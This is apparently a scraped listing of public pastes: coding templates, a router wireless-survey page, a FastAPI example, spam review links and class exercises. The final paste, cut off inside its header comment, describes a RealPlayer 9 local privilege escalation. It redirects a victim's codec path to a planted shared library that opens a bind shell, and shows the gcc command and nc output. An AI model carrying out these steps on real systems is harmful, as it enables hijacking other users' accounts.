https://paste.ee/p/CSfaA
https://start.me/w/Y8yN42
https://hackmd.io/@rerewilli6/r1gzYHJCp
https://muckrack.com/ferra-erat/bio
https://profile.hatena.ne.jp/dahlia12/
"
tvCueDFm,Professional template,safarislava,C++,Wednesday 13th of March 2024 10:43:37 AM CDT,"#include ""bits/stdc++.h""
#include ""ext/pb_ds/tree_policy.hpp""
#include ""ext/pb_ds/assoc_container.hpp""
#define ll long long
#define ld long double
#define forn(i, n) for (int i = 0; i < n; i++)
#define fori(i, s) for (auto i = s.begin(); i != s.end(); i++)

using namespace std;
using namespace __gnu_pbds;
typedef tree<ll, null_type, less<>, rb_tree_tag, tree_order_statistics_node_update> ordered_set;
typedef tree<ll, null_type, less_equal<>, rb_tree_tag, tree_order_statistics_node_update> ordered_multiset;

struct seg_tree{
    struct node{
        ll a;
    };
    node ZERO {0};

    node combain(node a, node b){
        return {a.a + b.a};
    }

    ll size;
    vector<node> tree;

    void init(ll n){
        size = 1;
        while (size < n) size *= 2;
        tree.assign(2*size-1, ZERO);
    }

    void build(vector<ll> a, ll x, ll lx, ll rx){
        if (rx - lx == 1){
            if (lx < a.size()) tree[x] = {a[lx]};
            return;
        }

        ll m = (lx + rx) / 2;
        build(a, 2*x+1, lx, m);
        build(a, 2*x+2, m, rx);
        tree[x] = combain(tree[2*x+1], tree[2*x+2]);
    }
    void build(vector<ll> a){
        build(a, 0, 0, size);
    }

    void set(ll i, node v, ll x, ll lx, ll rx){
        if (rx - lx == 1){
            tree[x] = v;
            return;
        }

        ll m = (lx + rx) / 2;
        if (i < m){
            set(i, v, 2*x+1, lx, m);
        } else {
            set(i, v, 2*x+2, m, rx);
        }
        tree[x] = combain(tree[2*x+1], tree[2*x+2]);
    }
    void set(ll i, node v){
        set(i, v, 0, 0, size);
    }

    node calc(ll l, ll r, ll x, ll lx, ll rx){
        if (l >= rx or r <= lx) return ZERO;
        if (l <= lx and r >= rx) return tree[x];

        ll m = (lx + rx) / 2;
        node a = calc(l, r, 2*x+1, lx, m);
        node b = calc(l, r, 2*x+2, m, rx);
        return combain(a, b);
    }
    node calc(ll l, ll r){
        calc(l, r, 0, 0, size);
    }
};

vector<int> z_func(string s){
    int n = s.size();
    int l = 0, r = 0;
    vector<int> z(n);
    for (int i = 1; i < n; i++){
        if (r >= i) z[i] = min(z[i - l], r-i+1);
        while (z[i] + i < n and s[z[i]] == s[z[i] + i]) z[i]++;
        if (z[i] + i - 1 > r){
            r = z[i] + i - 1;
            l = i;
        }
    }
    return z;
}

void radix_sort(vector<int> &p, vector<int> &c) {
    int n = p.size();
    vector<int> cnt(n), p_new(n), pos(n);
    for (auto x: c) {
        cnt[x]++;
    }
    pos[0] = 0;
    for (int i = 1; i < n; i++) {
        pos[i] = pos[i - 1] + cnt[i - 1];
    }
    for (auto x : p) {
        int i = c[x];
        p_new[pos[i]] = x;
        pos[i]++;
    }
    p = p_new;
}

vector<int> suf_alg(string s){
    s += ""$"";
    int n = s.size();
    vector<int> p(n), c(n);

    vector<vector<int>> suf;
    for(int i = 0; i < n; i++){
        suf.push_back({s[i], i});
    }
    std::sort(suf.begin(), suf.end());

    for (int i = 0; i < n; i++) p[i] = suf[i][1];
    c[p[0]] = 0;
    for (int i = 1; i < n; i++){
        if (suf[i][0] == suf[i-1][0]){
            c[p[i]] = c[p[i-1]];
        }
        else {
            c[p[i]] = c[p[i-1]] + 1;
        }
    }

    int l = 1;
    for (; l <= n; l *= 2){
        for (int i = 0; i < s.size(); i++){
            p[i] = (p[i] - l + n) % n;
        }

        radix_sort(p, c);

        vector<int> c_new(n);
        c[p[0]] = 0;
        for (int i = 1; i < n; i++){
            pair<int, int> prev = {c[p[i-1]], c[(p[i-1] + l) % n]};
            pair<int, int> now = {c[p[i]], c[(p[i] + l) % n]};
            if (prev == now){
                c_new[p[i]] = c_new[p[i-1]];
            }
            else {
                c_new[p[i]] = c_new[p[i-1]] + 1;
            }
        }
        c = c_new;
    }
    return p;
}

void solve(){

}


int main(){
    ios::sync_with_stdio(false);
    cin.tie(nullptr); cout.tie(nullptr);

    int t; cin >> t;
    while (t--) solve();

    return 0;
}"
2r2Wg8MW,Template,safarislava,C++,Wednesday 13th of March 2024 10:38:16 AM CDT,"#include ""bits/stdc++.h""
#include ""ext/pb_ds/tree_policy.hpp""
#include ""ext/pb_ds/assoc_container.hpp""

using namespace std;
using namespace __gnu_pbds;

#define ll long long
#define ld long double
#define forn(i, n) for (int i = 0; i < n; i++)
#define fori(i, s) for (auto i = s.begin(); i != s.end(); i++)
typedef tree<ll, null_type, less<>, rb_tree_tag, tree_order_statistics_node_update> ordered_set;
typedef tree<ll, null_type, less_equal<>, rb_tree_tag, tree_order_statistics_node_update> ordered_multiset;

void solve(){

}

int main(){
    ios::sync_with_stdio(false);
    cin.tie(nullptr); cout.tie(nullptr);

    int t; cin >> t;
    while (t--) solve();

    return 0;
}"
rqq8Kx15,Pastes.io - #1 Pastebin Alternative,xxsa,PHP,Wednesday 13th of March 2024 10:33:47 AM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

150+ different syntax languages ( All Free )
Paste Folders
Load files feature
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Embed, download, print pastes
Clone pastes
Socialite (Facebook/Twitter/Google Social login)
Load files feature
Trending pastes page (day, week, month, year)
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Facebook/Disqus/Custom comment system
Invisible/Custom captcha protection
Trending pastes page (day, week, month, year)
No Captcha for logged in users feature
Simple Ads by Google Adsense Few rather than Pastebin"
g1DzAjkG,Ejemplo clase,cardel,Python,Wednesday 13th of March 2024 10:32:44 AM CDT,"""""""
Autor: Carlos A Delgado
Fecha: 13 de Marzo de 2024
Descripción: EJemplo del número de pinos, oyameles y cedros de las diapositivas
""""""
cnt_h = int(input(""Ingrese la cantidad de hectarias ""))

def hallar_cantidades(cnt_hec):
  metros_cuadrados = cnt_hec*10000
  cnt_pinos = 0
  cnt_cedros = 0
  cnt_oyameles = 0
  if metros_cuadrados > 1000000:
    cnt_pinos = int((metros_cuadrados/10)*8*0.7)
    cnt_oyameles = int((metros_cuadrados/15)*15*0.2)
    cnt_cedros = int((metros_cuadrados/18)*10*0.1)
  else:
    cnt_pinos = int((metros_cuadrados/10)*8*0.5)
    cnt_oyameles = int((metros_cuadrados/15)*15*0.3)
    cnt_cedros = int((metros_cuadrados/18)*10*0.2)

  print(f""La cantidad de pinos es {cnt_pinos} la cantidad de oyameles es {cnt_oyameles} y la cantidad de cendros es {cnt_cedros}"")


hallar_cantidades(cnt_h)
"
wFV6yVRz,tools-survey.asp,rs232,JavaScript,Wednesday 13th of March 2024 10:29:01 AM CDT,"<!DOCTYPE html>
<html lang=""en-GB"">
<head>
<meta http-equiv=""content-type"" content=""text/html;charset=utf-8"">
<meta name=""robots"" content=""noindex,nofollow"">
<title>[<% ident(); %>] Tools: Wireless Survey</title>
<link rel=""stylesheet"" type=""text/css"" href=""tomato.css"">
<% css(); %>
<script src=""tomato.js""></script>
<style>
#ellipses2 { border: 1px solid #ccccdd; }
#ellipses5 { border: 1px solid #ccdddd; }
}
</style>
<script>
//	<% nvram(""wl0_radio,wl1_radio,wl2_radio,wl0_channel,wl1_channel,wl2_channel,wl0_nband,wl1_nband,wl2_nband,wl0_nbw,wl1_nbw,wl2_nbw,wl0_mode,wl1_mode,wl2_mode,wl0_nctrlsb,wl1_nctrlsb,wl2_nctrlsb""); %>
var w10_n = parseInt(nvram.wl0_nband);
var wl0_r = parseInt(nvram.wl0_radio);
var wl0_c = parseInt(nvram.wl0_channel);
var wl0_w = parseInt(nvram.wl0_nbw);
var wl0_m = nvram.wl0_mode;
var wl0_s = nvram.wl0_nctrlsb;
var w11_n = parseInt(nvram.wl1_nband);
var wl1_r = parseInt(nvram.wl1_radio);
var wl1_c = parseInt(nvram.wl1_channel);
var wl1_w = parseInt(nvram.wl1_nbw);
var wl1_m = nvram.wl1_mode;
var wl1_s = nvram.wl1_nctrlsb;
var w12_n = parseInt(nvram.wl2_nband);
var wl2_r = parseInt(nvram.wl2_radio);
var wl2_c = parseInt(nvram.wl2_channel);
var wl2_w = parseInt(nvram.wl2_nbw);
var wl2_m = nvram.wl2_mode;
var wl2_s = nvram.wl2_nctrlsb;
function hexToDecimal(hexColor) {
hexColor = hexColor.replace('#', '');
// Extract red, green, and blue components
var red = parseInt(hexColor.substring(0, 2), 16);
var green = parseInt(hexColor.substring(2, 4), 16);
var blue = parseInt(hexColor.substring(4, 6), 16);
// Return comma-separated decimal values
return red + ', ' + green + ', ' + blue;
}
var colors = [
    ""FF6347"", // Tomato
    ""32CD32"", // LimeGreen
    ""4169E1"", // RoyalBlue
    ""FFD700"", // Gold
    ""FF69B4"", // HotPink
    ""00CED1"", // DarkTurquoise
    ""9932CC"", // DarkOrchid
    ""FFA500"", // Orange
    ""008080"", // Teal
    ""FFC0CB"", // Pink
    ""800000"", // Maroon
    ""808000"", // Olive
    ""008000"", // Green
    ""000080"", // Navy
    ""800080"", // Purple
    ""FFD700"", // Gold
    ""7FFFD4"", // Aquamarine
    ""A52A2A"", // Brown
    ""2E8B57"", // SeaGreen
    ""8A2BE2""  // BlueViolet
];
var wlscandata = [];
var entries = [];
var dayOfWeek = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
var cmd = null;
var ref = new TomatoRefresh('update.cgi', 'exec=wlscan', 0, 'tools_survey_refresh');
ref.refresh = function(text) {
try {
eval(text);
}
catch (ex) {
}
sg.removeAllData();
sg.populate();
sg.resort();
}
var sg = new TomatoGrid();
sg.setup = function() {
this.init('survey-grid','sort');
this.headerSet(['Last Seen','RGB','SSID','BSSID','RSSI &nbsp; &nbsp; ','Quality','Channel','Security','Rates']);
this.populate();
this.sort(0);
}
function drawEllipse(c, m, q, col)
    {
				<!-- console.log(c); -->
				<!-- console.log(m); -->
				<!-- console.log(q); -->
				<!-- console.log(col); -->
		if (c<35){ var canvas  = document.getElementById(""ellipses2"");
        var ctx = canvas.getContext('2d');
		if (m==20) { mf = (canvas.width/19)*2.2; }
		else if (m==40){ mf = (canvas.width/19)*4.4; }
		if (c==1) { cf = (canvas.width/19)*3; }
		else if (c==14) { cf = ( canvas.width / 19) * 16.6 }
		else { cf = ((canvas.width/19)*3) + ((canvas.width/19)*(c-1)); }
		rf = q*2;
}
		else if (c>35){ var canvas  = document.getElementById(""ellipses5"");
        var ctx = canvas.getContext('2d');
		var cc = c;
		if (m==20) { mf = ((canvas.width/38)*0.35); }
		else if (m==40) { mf = ((canvas.width/38)*0.75); // 52 =54 [ 50 - 58 ] 
				cc = getDisplayChannel(c,m);				
				<!-- console.log(c); -->
				<!-- console.log(m); -->
				<!-- console.log(cc);  -->
				}
		else if (m==80) { mf = ((canvas.width/38)*1.7); // 100 = 106 [ 98 - 114 ]
				cc = getDisplayChannel(c,m); 
				<!-- console.log(c); -->
				<!-- console.log(m); -->
				<!-- console.log(cc);  -->
				} 
		cc = cc-36;
		cf = (canvas.width/38) + ((canvas.width/38)*(cc/4));
		rf = q * 2;
}	    
		ctx.beginPath();
		var decimalColor = hexToDecimal(col);
		ctx.fillStyle = ""rgba( "" + decimalColor + "", 0.6)"";
        ctx.ellipse(cf, 200, mf, rf, 0, 0, 2 * Math.PI, false);
		ctx.strokeStyle = ""#666666"";
        ctx.stroke();
        ctx.fill();
		ctx.closePath();
    }
function getDisplayChannel(channelNum, channelWidth) {
    const centerFreq40MHz = [38, 46, 54, 62, 102, 110, 118, 126, 134, 142, 151, 159, 167, 175];
    const centerFreq80MHz = [42, 58, 106, 122, 138, 155, 163];
    if (channelWidth === 80) {
        let minDiff = Infinity;
        let bestChannel = null;

        for (let i = 0; i < centerFreq80MHz.length; i++) {
            const diff = Math.abs(channelNum - centerFreq80MHz[i]);
            if (diff < minDiff) {
                minDiff = diff;
                bestChannel = centerFreq80MHz[i];
            }
        }
        return bestChannel;
    } else if (channelWidth === 40) {
        let minDiff = Infinity;
        let bestChannel = null;

        for (let i = 0; i < centerFreq40MHz.length; i++) {
            const diff = Math.abs(channelNum - centerFreq40MHz[i]);
            if (diff < minDiff) {
                minDiff = diff;
                bestChannel = centerFreq40MHz[i];
            }
        }
        return bestChannel;
    }
    return null;
}

sg.populate = function() {
var added = 0;
var removed = 0;
var i, j, k, t, e, s;
if ((wlscandata.length == 1) && (!wlscandata[0][0])) {
setMsg('error: '+wlscandata[0][1]);
return;
}
clearCanvas('ellipses2');
clearCanvas('ellipses5');
drawBoard('ellipses2');
drawBoard('ellipses5');
for (i = 0; i < wlscandata.length; ++i) {
s = wlscandata[i];
e = null;
for (j = 0; j < entries.length; ++j) {
if (entries[j].bssid == s[0]) {
e = entries[j];
break;
}
}
if (!e) {
++added;
e = {};
e.firstSeen = new Date();
entries.push(e);
}
e.lastSeen = new Date();
e.bssid = s[0];
e.ssid = s[1];
e.channel = s[3];
e.channel = e.channel+'<br><small>'+s[9]+' GHz<\/small><br><small>'+s[4]+' MHz<\/small>';
e.rssi = s[2];
e.mhz = s[4];
e.cap = s[7]+ '<br>'+s[8];
e.rates = s[6];
if (e.rssi != -999) {
if (e.rssi >= -50)
e.qual = 100;
else if (e.rssi >= -80) 
e.qual = Math.round(24 + ((e.rssi + 80) * 26)/10);
else if (e.rssi >= -90) 
e.qual = Math.round(24 + ((e.rssi + 90) * 26)/10);
else
e.qual = 0;
}
else {
e.qual = -1;
}
}
t = E('expire-time').value;
if (t > 0) {
var cut = (new Date()).getTime() - (t * 1000);
for (i = 0; i < entries.length; ) {
if (entries[i].lastSeen.getTime() < cut) {
entries.splice(i, 1);
++removed;
}
else
++i;
}
}
for (i = 0; i < entries.length; ++i) {
var seen, m, mac;
e = entries[i];
seen = e.lastSeen.toWHMS();
if (useAjax()) {
m = Math.floor(((new Date()).getTime() - e.firstSeen.getTime()) / 60000);
if (m <= 10)
seen += '<br> <b><small>NEW ('+m+'m)<\/small><\/b>';
}
mac = e.bssid;
var decimalColor = hexToDecimal(colors[i]);
e.col = '<div style=""padding: 5px; width: 15px; height: 30px; background-color: rgba(' + decimalColor +', 0.8);""></div>';

if (mac.match(/^(..):(..):(..)/))
mac = '<a href=""javascript:searchOUI(\''+RegExp.$1+'-'+RegExp.$2+'-'+RegExp.$3+'\','+i+')"" title=""OUI Search"">'+mac+'<\/a><div style=""display:none"" id=""gW_'+i+'"">&nbsp; <img src=""spin.gif"" alt="""" style=""vertical-align:middle""><\/div>';
sg.insert(-1, e, [ '<small>'+seen+'<\/small>', ''+e.col, ''+e.ssid, mac, (e.rssi < 0 ? e.rssi+' <small>dBm<\/small>' : ''),
(e.qual < 0 ? '' : '<small>'+e.qual+'<\/small> <img src=""bar'+MIN(MAX(Math.floor(e.qual / 12), 1), 6)+'.gif"" id=""bar_'+i+'"" alt="""">'),
''+e.channel, ''+e.cap, ''+e.rates], false);
var chan = e.channel.split(""<"");
drawEllipse(chan[0], e.mhz, e.qual, colors[i]);
}
drawFT();
drawCoordinates('ellipses2', -2, 17, 1, 13, 19, 1); //min, max, display min, display max, total num, increment
drawCoordinates('ellipses5', 32, 184, 36, 180, 38, 4);
s = '';
if (useAjax())
s = added+' added, '+removed+' removed, ';
s += entries.length+' total.';
s += '<br><br><small>Last updated: '+(new Date()).toWHMS()+'<\/small>';
setMsg(s);
wlscandata = [];
}
sg.sortCompare = function(a, b) {
var col = this.sortColumn;
var da = a.getRowData();
var db = b.getRowData();
var r;
switch (col) {
case 0:
r = -cmpDate(da.lastSeen, db.lastSeen);
break;
case 3:
r = cmpInt(da.rssi, db.rssi);
break;
case 4:
r = cmpInt(da.qual, db.qual);
break;
case 5:
r = cmpInt(da.channel, db.channel);
break;
default:
r = cmpText(a.cells[col].innerHTML, b.cells[col].innerHTML);
}
if (r == 0)
r = cmpText(da.bssid, db.bssid);
return this.sortAscending ? r : -r;
}
Date.prototype.toWHMS = function() {
return dayOfWeek[this.getDay()]+' '+this.getHours()+':'+this.getMinutes().pad(2)+ ':'+this.getSeconds().pad(2);
}
function setMsg(msg) {
elem.setInnerHTML(E('survey-msg'), msg);
}
function drawFT() {
if (typeof wl0_r !== 'undefined' && wl0_r == 1 && wl0_m != 'sta') {
	drawEllipse(wl0_c, wl0_w, 100, '#888888');
	}
if (typeof wl1_r !== 'undefined' && wl1_r == 1 && wl1_m != 'sta') {
	drawEllipse(wl1_c, wl1_w, 100, '#888888');
	}
if (typeof wl2_r !== 'undefined' && wl2_r == 1 && wl2_m != 'sta' ) {
	drawEllipse(wl2_c, wl2_w, 100, '#888888');
	}
<!-- drawEllipse('11',  '20', '80', '888888'); -->
<!-- drawEllipse('14',  '20', '80', '888888'); -->
<!-- drawEllipse('36',  '20', '80', '888888'); -->
<!-- drawEllipse(102,  40, 80, '888888'); -->
<!-- drawEllipse(120, 80, 80, '#888888'); -->
<!-- drawEllipse('176', '20', '80', '888888');  -->
}

function drawCoordinates(a, b, c, d, e, f, g) {
    // Get the canvas element
    var canvas = document.getElementById(a);
    var ctx = canvas.getContext('2d');
    var minX = b
    var maxX = c
	var minV = d
	var maxV = e
    var numDivisions = f;
    var incrementX = g;
    // Draw x-axis
    ctx.beginPath();
    ctx.moveTo(0, canvas.height);
    ctx.lineTo(canvas.width, canvas.height);
	ctx.fillStyle = ""black"";

if (a=='ellipses2') {
for (let i = 0; i <= numDivisions; i++) {
  let x;
  if (i === 0) {
    x = minX + 2 * incrementX;
  } else if (i === numDivisions) {
    x = maxX - 2 * incrementX;
  } else {
    x = minX + i * incrementX;
  }
  if (x >= 1 && x <= 13) {
    let xPos = (canvas.width / (maxX - minX)) * (x - minX);
	ctx.textAlign = ""center"";	
    ctx.fillText(x, xPos, canvas.height - 1);
  }
}
  	ctx.textAlign = ""center"";
    xPos = ( canvas.width / (maxX - minX)) * 16.6
 	ctx.fillText(14, xPos, canvas.height - 1); 
}
else if (a=='ellipses5') {
for (let i = 0; i <= numDivisions; i++) {
  let x;
  if (i === 0) {
    x = minX + 1 * incrementX;
  } else if (i === numDivisions) {
    x = maxX - 1 * incrementX;
  } else {
    x = minX + (i + 1) * incrementX;
  }
  if (x >= 32 && x <= 64 || x >=100 && x <= 144 ) {
    let xPos = (canvas.width / (maxX - minX)) * (x - minX);
	ctx.textAlign = ""center"";
    ctx.fillText(x, xPos, canvas.height - 1);
  }
}
for (let i = 0; i <= 38; i++) {
  let x;
  if (i === 0) {
    x = 33 + 1 * 4;
  } else if (i === 38) {
    x = 184 - 1 * 4;
  } else {
    x = 33 + (i + 1) * 4;
  }
  if (x >= 149 && x <= 177 ) {
    let xPos = (canvas.width / (184 - 33)) * (x - 33);
	ctx.textAlign = ""center"";
    ctx.fillText(x, xPos, canvas.height - 1);
  }
}
}

}
function drawBoard(can){
	var bw = 750;
	var bh = 200;
	// Padding
	var p = 0;
	var canvas = document.getElementById(can);
	var context = canvas.getContext(""2d"");	
	// Add sepia areas
	if (can == 'ellipses2') {
	    for (var x = 0; x <= bw; x += (canvas.width/19)) {
        context.moveTo(0.5 + x + p, p);
        context.lineTo(0.5 + x + p, bh + p);
    }
		    for (var x = 0; x <= bh; x += (canvas.height/4)) {
        context.moveTo(p, 0.5 + x + p);
        context.lineTo(bw + p, 0.5 + x + p);
    }
		context.strokeStyle = ""#eeeeee"";
		context.stroke();
		context.rect(0, 0, canvas.width/19*3, 200);
		context.rect(canvas.width/19*15, 0, canvas.width/19*11, 200);
		context.fillStyle = ""rgba(112,66,20,0.08)"";
		context.fill();
		context.rect(canvas.width/19*13, 0, canvas.width/19*15, 200);
		context.fillStyle = ""rgba(112,66,20,0.06)"";
		context.fill();
	}	
	else if (can == 'ellipses5') {
	    for (var x = 0; x <= bw; x += (canvas.width/38)) {
        context.moveTo(0.5 + x + p, p);
        context.lineTo(0.5 + x + p, bh + p);
    }
		    for (var x = 0; x <= bh; x += (canvas.height/4)) {
        context.moveTo(p, 0.5 + x + p);
        context.lineTo(bw + p, 0.5 + x + p);
    }
		context.strokeStyle = ""#eeeeee"";
		context.stroke();
		context.rect(0, 0, canvas.width/38, 200);
		context.rect(canvas.width/38*8, 0, canvas.width/38*9, 200);
		context.rect(canvas.width/38*36.25, 0, canvas.width, 200);
		context.fillStyle = ""rgba(112,66,20,0.08"";
		context.fill();
		context.rect(canvas.width/38*28.3, 0, canvas.width/38*0.6, 200);
		context.fillStyle = ""rgba(112,66,20,0.06)"";
		context.fill();		
	}
}
function clearCanvas(canvas) {
canvas = document.getElementById(canvas);
const ctx = canvas.getContext('2d');
ctx.clearRect(0, 0, canvas.width, canvas.height);
ctx.fillStyle = ""#fdfdfd"";
ctx.fillRect(0, 0, canvas.width, canvas.height);
}
function earlyInit() {
if (!useAjax())
E('expire-time').style.display = 'none';
sg.setup();
}
function init() {
sg.recolor();
ref.initPage();
}
</script>
</head>
<body onload=""init()"">
<form action=""javascript:{}"">
<table id=""container"">
<tr><td colspan=""2"" id=""header"">
<div class=""title"">FreshTomato</div>
<div class=""version"">Version <% version(); %> on <% nv(""t_model_name""); %></div>
</td></tr>
<tr id=""body""><td id=""navi""><script>navi()</script></td>
<td id=""content"">
<div id=""ident""><% ident(); %> | <script>wikiLink();</script></div>
<div class=""tomato-chart"">Wireless Channel Congestion 2.4 GHz</div>
<canvas id=""ellipses2"" width=""756"" height=""200"" border=1></canvas>
<p>
<div class=""tomato-chart"">Wireless Channel Congestion 5 GHz</div>
<canvas id=""ellipses5"" width=""756"" height=""200"" border=1></canvas>
<p>
<div class=""section-title"">Wireless Site Survey</div>
<div class=""section"">
<div id=""survey-grid"" class=""tomato-grid""></div>
<div id=""survey-msg""></div>
<div id=""survey-warn"">
<script>
if ('<% wlclient(); %>' == '0')
document.write('<b>Warning:<\/b> Wireless connections to this router may be disrupted while using this tool.<br>');
</script>
<b>Note:</b> Wireless Survey will not show any results with WL filter turned on in 'permit only' mode.
</div>
</div>
<div id=""footer"">
<div id=""survey-controls"">
<img src=""spin.gif"" alt="""" id=""refresh-spinner"">
<script>
genStdTimeList('expire-time', 'Expires = ♾️',3);
genStdTimeList('refresh-time', 'One off', 3);
</script>
<input type=""button"" value=""Refresh"" onclick=""ref.toggle()"" id=""refresh-button"">
</div>
</div>
</td></tr>
</table>
</form>
<script>earlyInit();</script>
</body>
</html>
"
26hGzTtw,Untitled,Aslanov01,C++,Wednesday 13th of March 2024 10:28:58 AM CDT,"#include <bits/stdc++.h>
#pragma comment(linker, ""/stack:200000000"")
#pragma GCC optimize(""O1,O2,O3,Ofast,unroll-loops"")
#pragma GCC target(""sse,sse2,sse3,sse4,sse4.1,sse4.2,popcnt,avx,avx2"")

#define pb push_back
#define pii pair <int, int>
#define pll pair <long long, long long>
#define pld pair <long double, long double>
#define ll long long
#define ld long double
#define x first
#define y second
#define all(v) v.begin(),v.end()
#define sz(s) (int)s.size()
#define skip continue
#define bpop(x) (ll)__builtin_popcountll(x)

using namespace std;

const int N = 5e5 + 7;
const int M = 1e5 + 7;
const int maxA = 2e6 + 7;
const int inf = 1e9 + 7;
const ll INF = 2e18 + 7;
const int MOD = 1e9 + 7;
const ld eps = 1e-9;

pii dir[] = {{0, 1}, {1, 0}, {0, -1}, {-1, 0}};

int n, a[N];
vector <ll> v;
void f() {
    vector <ll> vec = v;
    sort(all(v));
    ll last = -inf;
    int cur = 0;
    map <ll, int> id;
    for (ll x : v) {
        if (x == last)skip;
        last = x, id[x] = ++cur;
    }
    for (int i = 1;i <= n;i++)a[i] = id[vec[i - 1]];
}
vector <pii> qs[N];
int q, ans[N], opt[N], cnt[N], Lst[N][60];
void solve() {
    cin >> n >> q;
    for (int i = 1;i <= n;i++) {
        ll x;
        cin >> x;
        while (x % 2 == 0)x /= 2, cnt[i]++;
        v.pb(x);
    }
    f();
    for (int i = 0;i < q;i++) {
        int l, r;
        cin >> l >> r;
        qs[r].pb({l, i});
    }
    for (int i = 1;i <= n;i++) {
        Lst[a[i]][cnt[i]] = i;
        for (int L = 0;L < 60;L++) {
            bool ok = 1;
            int opti = inf;
            for (int R = L;R < 60;R++) {
                int k = R - L;
                ok &= (Lst[a[i]][R] > 0);
                if (!ok)break;
                opti = min(opti, Lst[a[i]][R]);
                opt[R - L] = max(opt[R - L], opti);
            }
        }
        for (auto p : qs[i]) {
            int l = p.x, id = p.y;
            for (int k = 59;k >= 0;k--) {
                if (opt[k] >= l) {
                    ans[id] = k;
                    break;
                }
            }
        }
    }
    for (int i = 0;i < q;i++)cout << ans[i] << '\n';
}
signed main() {
    //srand(time(NULL));
    ios_base::sync_with_stdio(0);
    cin.tie(0);
    //freopen(""G.in"", ""r"", stdin);
    //freopen(""G.out"", ""w"", stdout);
    int test = 1;
    //cin >> test;
    for (int t = 1;t <= test;t++) {
        //cout << ""Case "" << t << "": "";
        solve();
    }
    return 0;
}"
SkCLSEFG,fastAPI CRUD,GeorgiLukanov87,Python,Wednesday 13th of March 2024 10:28:48 AM CDT,"from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from typing import Dict

# Define a Pydantic model for our data
class Item(BaseModel):
    name: str
    description: str = None
    price: float
    tax: float = None

app = FastAPI()

# In-memory database
database: Dict[int, Item] = {}

# Counter for generating unique IDs
id_counter = 0

# Create operation
@app.post(""/items/"")
async def create_item(item: Item):
    global id_counter
    id_counter += 1
    database[id_counter] = item
    return {""id"": id_counter, **item.dict()}

# Read operation
@app.get(""/items/{item_id}"")
async def read_item(item_id: int):
    item = database.get(item_id)
    if not item:
        raise HTTPException(status_code=404, detail=""Item not found"")
    return item

# Update operation
@app.put(""/items/{item_id}"")
async def update_item(item_id: int, item: Item):
    if item_id not in database:
        raise HTTPException(status_code=404, detail=""Item not found"")
    database[item_id] = item
    return {""id"": item_id, **item.dict()}

# Delete operation
@app.delete(""/items/{item_id}"")
async def delete_item(item_id: int):
    if item_id not in database:
        raise HTTPException(status_code=404, detail=""Item not found"")
    del database[item_id]
    return {""message"": ""Item deleted""}



""""""
With this code:

You can create items by sending a POST request to /items/.
You can read items by sending a GET request to /items/{item_id}.
You can update items by sending a PUT request to /items/{item_id}.
You can delete items by sending a DELETE request to /items/{item_id}.
For example:

To create an item: POST /items/ with JSON body {""name"": ""item1"", ""description"": ""description1"", ""price"": 10.5, ""tax"": 1.05}.
To read the item with ID 1: GET /items/1.
To update the item with ID 1: PUT /items/1 with JSON body {""name"": ""updated_item1"", ""description"": ""updated_description1"", ""price"": 20.5, ""tax"": 2.05}.
To delete the item with ID 1: DELETE /items/1.
""""""
"
krJh7zpe,Review XGLOBAL Markets,reviewbrokers,PHP,Wednesday 13th of March 2024 10:22:03 AM CDT,https://www.reviewbrokers.net/review-xglobal-markets/
WpygKX2r,Review XGLOBAL FX,reviewbrokers,PHP,Wednesday 13th of March 2024 10:02:31 AM CDT,https://www.reviewbrokers.net/review-xglobal-fx/
HfyxfSQc,Untitled,dllbridge,C,Wednesday 13th of March 2024 09:52:13 AM CDT,"


#include  <stdio.h>

int i1 = 12,
    i2 = 15;
    
    
char sz[77] = ""SONY"";    




/////////////////////////////////////////
int main()                             //
{



    printf(""%d %s %d"", i1, sz, i2);



}












/*
#include  <stdio.h>

int i = 13; 




/////////////////////////////////////////
int main()                             //
{

    char sz[77] = ""September"";	
	
	if(i ==  9) { printf(""%s     \n"", sz);   return 0; }
	if(i == 10) { printf(""October    \n"");	 return 0; }
	if(i == 13) { printf(""%s\n"", ""Error"");	 return 0; }
	
	printf(""Does not exist. \n"");
	
}


*/



















/*
    switch(i) 
	{
		
	   case  9: printf(""September \n"");
	            break;	

	   case 10: printf(""October \n"");
	            break;

	   case 13: printf(""Error! \n"");
	            break;
	
	   default: printf(""Does not exist. \n"");
		
	}  
       
       */




"
tVprYn7y,RealPlayer 9 *nix - Local Privilege Escalation,FlyFar,C,Wednesday 13th of March 2024 09:51:10 AM CDT,"/**
 * rp9-priv-esc.c 
 *
 * A local privilege escalation attack against the community supported
 * version of Real.com's Realplayer, version 9.
 *
 * Written by:
 * 	
 * 	Jon Hart warchild spoofed.org
 *
 * By default, configuration files are stored in ~$USER/.realnetworks/, 
 * but all the files in there are group writeable.  So long as ~$USER 
 * has group execution permissions (which is pretty common), a malicious
 * local user can edit the config files of fellow users to do his biddings.  
 *
 * There are a number of ways to attack this, but after some poking it seems
 * that modifying the path to shared libraries and writing my own malicious
 * shared libraries was the easiest.  
 * 
 * (as an aside, just because the shared libraries in the directories contained
 * in ~$USER/.realnetworks/RealShared_0_0/ are stripped doesn't mean we can't get 
 * the symbols back.  objdump quickly can tell us what the names of the 15 
 * functions are, and we can stub out a bogus shared library pretty quickly.)
 *
 * This particular bit of code is meant to replace the shared library 
 * cook.so.6.0, which is contained in the Codecs directory.  To execute this 
 * attack against a fellow local user, first edit their config file 
 * (~victim/.realnetworks/RealShared_0_0) to have the 'dt_codecs' variable
 * point to a directory under your control, like /tmp/Codecs.  Copy all of the 
 * existing files from the previous value of dt_codecs (which is usually something
 * like ~victim/Real/Codecs/) to /tmp/Codecs.  Next, compile the code below as a
 * shared library and copy it to the trojaned directory:
 *
 * 
 * `gcc -shared -fPIC -o /tmp/Codecs/cook.so.6.0 rp9-priv-esc.c`
 *
 *	The next time the victim fires up realplayer 9, a nice little shell 
 * will be listening on port 12345 for you:
 *
 * guest@haiti:/$ id
 * uid=1006(guest) gid=100(users) groups=100(users)
 * guest@haiti:/$ nc localhost 12345
 * id
 * uid=1000(warchild) gid=100(users) groups=100(users),40(src),1003(wheel)
 *
